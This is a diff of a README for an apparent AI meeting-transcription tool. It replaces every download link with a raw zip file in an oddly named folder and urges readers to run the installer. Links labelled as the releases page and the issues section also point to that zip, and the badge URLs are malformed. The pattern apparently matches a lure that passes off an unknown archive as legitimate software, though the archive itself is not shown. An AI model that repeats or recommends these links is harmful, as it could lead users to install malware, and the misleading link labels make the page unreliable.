@@ -4,7 +4,7 @@
 Welcome to the AI-Meeting-Companion-STT! This tool helps you record and summarize your meetings effortlessly. Simply download the application and follow the steps below to get started.
 
 ## 📦 Download Now
-[![Download the latest version](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip%20Latest%20Version-Click%https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip)](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip)
+[![Download the latest version](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip%20Latest%20Version-Click%https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip)](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip)
 
 ## 🛠️ System Requirements
 Before you begin, ensure your device meets the following requirements:
@@ -15,11 +15,11 @@ Before you begin, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Go to the following link to download the application:  
-    [Download from Releases Page](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip)
+    [Download from Releases Page](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip)
 
 2. **Choose the Right Version:** You will see a list of available versions. Select the most recent version, which typically has the highest number (e.g., v1.0.0).
 
-3. **Download the Installer:** Click on the installer for your operating system. It will either be a file like `https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip` for Windows or `https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip` for macOS.
+3. **Download the Installer:** Click on the installer for your operating system. It will either be a file like `https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip` for Windows or `https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip` for macOS.
 
 4. **Run the Installer:** 
    - For Windows: Locate and double-click the downloaded `.exe` file. Follow the on-screen prompts to install.
@@ -50,7 +50,7 @@ Yes, this application is suitable for any audio meeting, whether it's in person 
 Yes, your audio and transcription data remain on your device. You can choose to upload it to cloud services if desired, but that is optional.
 
 ### What if I encounter issues?
-If you experience problems, please check the [Issues section](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip) on the GitHub page for help or to report bugs.
+If you experience problems, please check the [Issues section](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip) on the GitHub page for help or to report bugs.
 
 ## 🌟 Additional Features
 - **Multilingual Support:** The app supports multiple languages for transcription.
@@ -63,4 +63,4 @@ If you'd like to contribute to the project, please feel free to fork the reposit
 ## 🎉 Thank You!
 Thank you for choosing the AI-Meeting-Companion-STT. We hope it makes your meetings more productive and organized. For the latest updates, be sure to check the Releases page regularly.
 
-[![Download the latest version](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip%20Latest%20Version-Click%https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip)](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/AI-Meeting-Companion-STT.zip)
+[![Download the latest version](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip%20Latest%20Version-Click%https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip)](https://raw.githubusercontent.com/Sameer125132/AI-Meeting-Companion-STT/main/counterintrigue/STT_Companion_A_Meeting_v2.7-alpha.4.zip)
